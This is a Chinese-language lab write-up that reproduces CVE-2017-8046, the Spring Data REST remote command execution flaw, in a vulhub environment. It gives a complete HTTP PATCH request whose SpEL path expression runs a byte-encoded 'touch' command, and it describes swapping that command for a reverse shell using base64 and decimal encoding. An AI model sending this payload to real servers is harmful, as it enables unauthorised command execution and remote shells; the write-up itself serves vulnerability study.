

# Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->SpEL命令执行

### 0x01漏洞介绍

​			Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现[RFC6902](https://tools.ietf.org/html/rfc6902)），path的值被传入`setValue`，导致执行了SpEL表达式，触发远程命令执行漏洞。

​			影响版本

  	Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本
  	Spring Boot 2.0.0M4之前的版本
  	Spring Data release trains Kay-RC3之前的版本

### 0x02漏洞复现

​	访问`http://your-ip:8080/`即可看到json格式的返回值，说明这是一个Restful风格的API服务器。

![Spring_Data_Rest_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Rest_RCE_1.jpg)

​	访问`http://your-ip:8080/customers/1`，看到一个资源。我们使用PATCH请求来修改之：

```
PATCH /customers/1 HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```

path的值是SpEL表达式，发送上述数据包，将执行`new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}`表示的命令`touch /tmp/success`。然后进入容器。

![Spring_Data_Rest_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Rest_RCE_2.jpg)

可见，success成功创建。

将bytecode改成反弹shell的命令（注意：[Java反弹shell的限制与绕过方式](http://www.jackson-t.ca/runtime-exec-payloads.html)），成功弹回：

此处需要先base64绕过，然后转换为ascii十进制

![Spring_Data_Rest_RCE_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Spring_Data_Rest_RCE_3.jpg)

